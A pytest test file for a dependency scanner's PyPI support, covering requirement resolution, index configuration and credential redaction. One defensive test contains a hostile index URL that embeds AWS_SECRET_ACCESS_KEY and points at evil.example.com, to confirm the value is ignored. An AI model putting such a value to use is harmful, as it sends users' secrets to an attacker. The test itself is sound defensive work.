import json
import os
import subprocess
from pathlib import Path

import pytest
from click.testing import CliRunner

from ts_scan.cli import scan as scan_cli
from ts_scan.pm import DependencyResolutionError, pypi
from ts_scan.pm.pypi import PypiScanner, _JsonMetadata, _active_requirements, _parse_requirements, _redact_url


def _meta(name, version, *requires, **fields):
    return _JsonMetadata({'name': name, 'version': version, 'requires_dist': list(requires), **fields})


def _names(reqs):
    return [(r.name, sorted(r.extras)) for r in reqs]


def _keys(dep):
    return [d.key for d in dep.dependencies]


def _find(dep, key):
    stack = [dep]
    while stack:
        d = stack.pop()
        if d.key == key:
            return d
        stack.extend(d.dependencies)
    return None


@pytest.fixture
def scan_with(monkeypatch, tmp_path):
    """Scans a project with the given root metadata against the given pip resolution."""

    def _scan(root, resolved, **options):
        monkeypatch.setattr(PypiScanner, '_resolve',
                            lambda self, path: ({pypi.canonicalize_name(m.get('Name')): m for m in resolved}, root))
        return PypiScanner(**options).scan(tmp_path)[0].dependencies[0]

    return _scan


@pytest.fixture
def fake_pip(monkeypatch):
    """Replaces the pip call; records the arguments and writes the given report or fails with the given stderr."""
    calls = []

    def _install(install=None, stderr=None):
        def _exec(self, *args, **kwargs):
            calls.append(list(args))
            envs.append(kwargs.get('env') or {})
            if stderr is not None:
                raise subprocess.CalledProcessError(1, ['python', *args], stderr=stderr)
            report = Path(args[list(args).index('--report') + 1])
            report.write_text(json.dumps({'version': '1', 'install': install or []}))

        monkeypatch.setattr(PypiScanner, '_exec', _exec)
        return calls

    envs = []
    _install.envs = envs
    return _install


def _item(name, version, *requires, project=False):
    return {
        'metadata': {'name': name, 'version': version, 'requires_dist': list(requires)},
        'requested': project,
        'download_info': {'url': 'file:///p', 'dir_info': {}} if project else {'url': 'https://x', 'archive_info': {}},
    }


def test_active_requirements_skip_extras_that_are_not_requested():
    reqs = _parse_requirements([
        'zipp>=3.20',
        'pytest>=6; extra == "test"',
        'sphinx-lint; extra == "doc"',
    ])

    assert _names(_active_requirements(reqs, set())) == [('zipp', [])]
    assert _names(_active_requirements(reqs, {'doc'})) == [('zipp', []), ('sphinx-lint', [])]


def test_active_requirements_evaluate_environment_markers():
    reqs = _parse_requirements([
        'importlib-metadata; python_version < "3.8"',
        'colorama; sys_platform == "nonexistent-platform"',
        'tomli; python_version >= "3.0"',
    ])

    assert _names(_active_requirements(reqs, set())) == [('tomli', [])]


def test_active_requirements_merge_repeated_requirements():
    reqs = _parse_requirements([
        'foo',
        'foo[bar]; extra == "all"',
    ])

    assert _names(_active_requirements(reqs, {'all'})) == [('foo', ['bar'])]
    # The parsed requirements are not modified
    assert _names(reqs) == [('foo', []), ('foo', ['bar'])]


def test_json_metadata_offers_the_package_metadata_interface():
    metadata = _JsonMetadata({'name': 'a', 'project_url': ['Source, https://x'], 'license_file': ['LICENSE']})

    assert metadata.get('Name') == 'a'
    assert metadata.get('Project-URL') == 'Source, https://x'
    assert metadata.get_all('Project-URL', []) == ['Source, https://x']
    assert metadata.get_all('License-File', []) == ['LICENSE']
    assert metadata.get_all('Requires-Dist', []) == []
    assert metadata.get('Summary', '') == ''


def test_scan_reports_resolved_versions_and_skips_optional_extras(scan_with):
    root = _meta('my-app', '1.0', 'click>=8.1', 'packageurl-python>=0.15', 'pytest; extra == "dev"')
    resolved = [
        _meta('click', '8.5.1', 'colorama; platform_system == "nonexistent"', 'importlib-metadata; python_version < "3.8"'),
        _meta('packageurl-python', '0.17.6', 'setuptools; extra == "build"', 'sqlalchemy>=2; extra == "sqlalchemy"'),
    ]

    dep = scan_with(root, resolved)

    assert _keys(dep) == ['pypi:click', 'pypi:packageurl-python']
    # Versions come from the resolution, not from the environment ts-scan runs in (click 8.1.7)
    assert [d.versions for d in dep.dependencies] == [['8.5.1'], ['0.17.6']]
    assert all(not d.dependencies for d in dep.dependencies)


def test_scan_follows_requested_extras(scan_with):
    root = _meta('my-app', '1.0', 'foo[speedups]', 'pytest; extra == "dev"')
    resolved = [
        _meta('foo', '2.0', 'bar; extra == "speedups"', 'baz; extra == "docs"'),
        _meta('bar', '3.0'),
        _meta('pytest', '9.0', 'pluggy'),
        _meta('pluggy', '1.6'),
    ]

    dep = scan_with(root, resolved, extras=('dev',))

    assert _keys(dep) == ['pypi:foo', 'pypi:pytest']
    assert _keys(dep.dependencies[0]) == ['pypi:bar']
    assert _keys(dep.dependencies[1]) == ['pypi:pluggy']


def test_scan_extras_option_accepts_comma_separated_values():
    assert PypiScanner(extras=('dev, Test', 'docs')).extras == {'dev', 'test', 'docs'}


def test_scan_expands_each_package_once_and_stops_at_cycles(scan_with):
    root = _meta('my-app', '1.0', 'a', 'b')
    resolved = [
        _meta('a', '1.0', 'shared'),
        _meta('b', '1.0', 'shared', 'b'),
        _meta('shared', '1.0', 'leaf'),
        _meta('leaf', '1.0'),
    ]

    dep = scan_with(root, resolved)
    a, b = dep.dependencies

    assert _keys(a) == ['pypi:shared']
    assert _keys(a.dependencies[0]) == ['pypi:leaf']
    # Second occurrence of 'shared' and the self reference of 'b' are leaves with a version
    assert _keys(b) == ['pypi:shared', 'pypi:b']
    assert [(d.versions, d.dependencies) for d in b.dependencies] == [(['1.0'], []), (['1.0'], [])]


def test_scan_follows_extras_requested_by_a_later_occurrence(scan_with):
    root = _meta('my-app', '1.0', 'a', 'foo[speedups]')
    resolved = [
        _meta('a', '1.0', 'foo'),
        _meta('foo', '2.0', 'common', 'bar; extra == "speedups"'),
        _meta('common', '1.0'),
        _meta('bar', '3.0'),
    ]

    dep = scan_with(root, resolved)

    assert _keys(dep.dependencies[0].dependencies[0]) == ['pypi:common']
    assert _keys(dep.dependencies[1]) == ['pypi:bar']


def test_scan_uses_canonical_package_names_in_keys(scan_with):
    root = _meta('My_App', '1.0', 'Importlib_Metadata', 'jaraco.functools')
    resolved = [
        _meta('importlib_metadata', '8.7.0'),
        _meta('jaraco.functools', '4.4.0'),
    ]

    dep = scan_with(root, resolved)

    assert dep.key == 'pypi:my-app'
    assert _keys(dep) == ['pypi:importlib-metadata', 'pypi:jaraco-functools']
    assert [d.name for d in dep.dependencies] == ['importlib_metadata', 'jaraco.functools']


def test_scan_reports_unresolved_requirements_without_version(scan_with):
    dep = scan_with(_meta('my-app', '1.0', 'missing-pkg'), [])

    assert _keys(dep) == ['pypi:missing-pkg']
    assert dep.dependencies[0].versions == []


def test_scan_ignores_installed_files_of_a_different_version(scan_with):
    # 'click' is installed in the test environment, but in another version than resolved
    dep = scan_with(_meta('my-app', '1.0', 'click'), [_meta('click', '0.0.1')])

    click = dep.dependencies[0]
    assert click.versions == ['0.0.1']
    assert click.package_files == []
    assert click.license_file is None


def test_scan_resolves_the_project_and_its_dependencies_with_pip(fake_pip, monkeypatch, tmp_path):
    monkeypatch.delenv('PIP_INDEX_URL', raising=False)
    calls = fake_pip([
        _item('my-app', '1.0', 'click>=8.1', project=True),
        _item('click', '8.5.1'),
    ])

    dep = PypiScanner(extras=('dev',)).scan(tmp_path)[0].dependencies[0]

    assert (dep.key, dep.versions) == ('pypi:my-app', ['1.0'])
    assert [(d.key, d.versions) for d in dep.dependencies] == [('pypi:click', ['8.5.1'])]

    args = calls[0]
    assert args[:4] == ['-m', 'pip', 'install', f'{tmp_path.resolve()}[dev]']
    assert {'--dry-run', '--ignore-installed'} <= set(args)
    assert 'PIP_INDEX_URL' not in fake_pip.envs[0]


def test_scan_uses_the_configured_package_indexes(fake_pip, monkeypatch, tmp_path):
    monkeypatch.setenv('NEXUS_TOKEN', 's3cr3t')
    calls = fake_pip([_item('my-app', '1.0', project=True)])

    PypiScanner(indexUrl='https://ci:${NEXUS_TOKEN}@nexus.example.com/repository/pypi/simple',
                extraIndexUrl=('https://internal.example.com/simple',)).scan(tmp_path)

    env = fake_pip.envs[0]
    assert env['PIP_INDEX_URL'] == 'https://ci:s3cr3t@nexus.example.com/repository/pypi/simple'
    assert env['PIP_EXTRA_INDEX_URL'] == 'https://internal.example.com/simple'
    # Credentials are not passed as arguments, which are visible in the process list
    assert not any('s3cr3t' in arg for arg in calls[0])


def test_scan_aborts_when_a_variable_in_the_index_url_is_not_set(fake_pip, monkeypatch, tmp_path):
    monkeypatch.delenv('NEXUS_TOKEN', raising=False)
    calls = fake_pip([_item('my-app', '1.0', project=True)])

    with pytest.raises(DependencyResolutionError, match='NEXUS_TOKEN'):
        PypiScanner(indexUrl='https://ci:${NEXUS_TOKEN}@nexus.example.com/simple').scan(tmp_path)

    assert calls == []


def test_scan_aborts_without_access_to_the_package_index(fake_pip, monkeypatch, tmp_path):
    monkeypatch.setenv('NEXUS_TOKEN', 's3cr3t')
    fake_pip(stderr='WARNING: Retrying ... NewConnectionError\n'
                    'ERROR: Could not find a version that satisfies the requirement click>=8.1 (from versions: none)\n'
                    'ERROR: No matching distribution found for click>=8.1\n')

    with pytest.raises(DependencyResolutionError) as err:
        PypiScanner(indexUrl='https://ci:${NEXUS_TOKEN}@nexus.example.com/simple').scan(tmp_path)

    text = str(err.value)
    assert 'No matching distribution found for click>=8.1' in text
    assert 'https://***@nexus.example.com/simple' in text
    assert 's3cr3t' not in text
    assert 'pypi_indexUrl' in text


def test_scan_aborts_on_resolution_failure_with_the_default_index(fake_pip, tmp_path):
    fake_pip(stderr='ERROR: No matching distribution found for click>=8.1\n')

    with pytest.raises(DependencyResolutionError, match='https://pypi.org/simple'):
        PypiScanner().scan(tmp_path)


def test_redact_url_hides_credentials():
    assert _redact_url('https://user:pw@host:8443/simple') == 'https://***@host:8443/simple'
    assert _redact_url('https://token@host/simple') == 'https://***@host/simple'
    assert _redact_url('https://host/simple') == 'https://host/simple'


def test_resolution_failure_aborts_the_whole_scan(fake_pip, tmp_path):
    (tmp_path / 'pyproject.toml').write_text('[project]\nname = "my-app"\n')
    fake_pip(stderr='ERROR: No matching distribution found for click\n')

    result = CliRunner().invoke(scan_cli.scan_dependencies, [str(tmp_path)])

    assert result.exit_code == 2
    assert 'No matching distribution found for click' in ' '.join(result.output.split())


def _scan_project(tmp_path, proj_cfg, env=None):
    from ts_scan.cli import cli

    project = tmp_path / 'project'
    project.mkdir()
    (project / 'pyproject.toml').write_text('[project]\nname = "my-app"\n')
    (project / 'tsproject.toml').write_text(proj_cfg)

    return CliRunner().invoke(cli, ['scan', '-o', str(tmp_path / 'scan.json'), str(project)], env=env)


@pytest.fixture
def no_tool_settings(monkeypatch, tmp_path):
    monkeypatch.setenv('HOME', str(tmp_path / 'home'))
    for name in list(os.environ):
        if name.startswith(('TS_', 'PIP_')):
            monkeypatch.delenv(name)


def test_scan_reads_the_package_index_from_the_project_settings(fake_pip, no_tool_settings, tmp_path):
    fake_pip([_item('my-app', '1.0', project=True)])

    result = _scan_project(tmp_path, 'pypi_indexUrl = "https://nexus.example.com/simple"\n'
                                     'pypi_extraIndexUrl = ["https://a.example.com/simple", "https://b.example.com/simple"]\n')

    assert result.exit_code == 0, result.output
    env = fake_pip.envs[0]
    assert env['PIP_INDEX_URL'] == 'https://nexus.example.com/simple'
    assert env['PIP_EXTRA_INDEX_URL'] == 'https://a.example.com/simple https://b.example.com/simple'


def test_scan_does_not_expand_environment_variables_from_the_project_settings(fake_pip, no_tool_settings,
                                                                               monkeypatch, tmp_path):
    # A foreign repository could otherwise send any environment variable to its own index
    monkeypatch.setenv('AWS_SECRET_ACCESS_KEY', 's3cr3t')
    fake_pip([_item('my-app', '1.0', project=True)])

    result = _scan_project(tmp_path, 'pypi_indexUrl = "https://${AWS_SECRET_ACCESS_KEY}@evil.example.com/simple"\n')

    assert result.exit_code == 0, result.output
    assert "Ignoring 'pypi_indexUrl'" in ' '.join(result.output.split())
    assert 'PIP_INDEX_URL' not in fake_pip.envs[0]


def test_scan_takes_index_credentials_from_the_tool_settings(fake_pip, no_tool_settings, monkeypatch, tmp_path):
    monkeypatch.setenv('NEXUS_TOKEN', 's3cr3t')
    fake_pip([_item('my-app', '1.0', project=True)])

    result = _scan_project(tmp_path, 'pypi_indexUrl = "https://nexus.example.com/simple"\n',
                           env={'TS_SCAN_PYPI_INDEXURL': 'https://ci:${NEXUS_TOKEN}@nexus.example.com/simple'})

    assert result.exit_code == 0, result.output
    assert fake_pip.envs[0]['PIP_INDEX_URL'] == 'https://ci:s3cr3t@nexus.example.com/simple'


@pytest.mark.parametrize('stderr', ['', 'ERROR: 401 Client Error for url: https://ci:s3cr3t@nexus.example.com/simple/click/\n'])
def test_resolution_errors_never_contain_credentials(fake_pip, monkeypatch, tmp_path, stderr):
    monkeypatch.setenv('NEXUS_TOKEN', 's3cr3t')
    fake_pip(stderr=stderr)

    with pytest.raises(DependencyResolutionError) as err:
        PypiScanner(indexUrl='https://ci:${NEXUS_TOKEN}@nexus.example.com/simple').scan(tmp_path)

    assert 's3cr3t' not in str(err.value)
    assert 'pip exited with code 1' in str(err.value) if not stderr else 'https://***@nexus.example.com' in str(err.value)
